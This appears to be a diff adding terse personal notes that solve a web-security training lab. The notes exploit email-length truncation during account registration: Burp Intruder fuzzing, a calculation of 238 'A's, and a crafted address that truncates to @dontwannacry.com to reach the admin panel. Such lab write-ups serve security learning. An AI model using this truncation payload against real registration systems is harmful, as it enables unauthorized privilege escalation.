@@ -1,0 +1,52 @@
+Inconsistent handling of exceptional input
+Goal: Exploit logic flaw in account registration process to gain access to the admin panel and delete Carlos
+
+1)
+-Try admin for the admin panel
+-Register
+-mike,  attacker@exploit-0a61001803aac749847ae14601ae00c5.exploit-server.net, Password1
+-Email, click link
+
+2)
+-Login
+-Logout
+
+3)
+-Register again
+-mike2, mike@aol.com
+-Send post to intruder
+-Paste in attacker email and url encode,attacker@exploit-0a61001803aac749847ae14601ae00c5.exploit-server.net
+-mark attacker
+-payloads
+-character blocks, step 100, max length 500
+-start
+
+4)
+-Check email
+-Click top one
+-Login as mike2
+-Email is all AAAAA...
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+255 characters
+@dontwannacry.com.exploit-0a61001803aac749847ae14601ae00c5.exploit-server.net
+255 - 17 - 238
+We need 238 As
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com.exploit-0a61001803aac749847ae14601ae00c5.exploit-server.net
+
+5)
+-Log out
+-Register again
+-mike3, mike3@aol.com
+
+4)
+-Send Post to repeater
+-Paste in, and url encode, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@dontwannacry.com.exploit-0a61001803aac749847ae14601ae00c5.exploit-server.net
+-Send
+
+5)
+-Click register email
+-Login
+-Admin
+-Delete Carlos
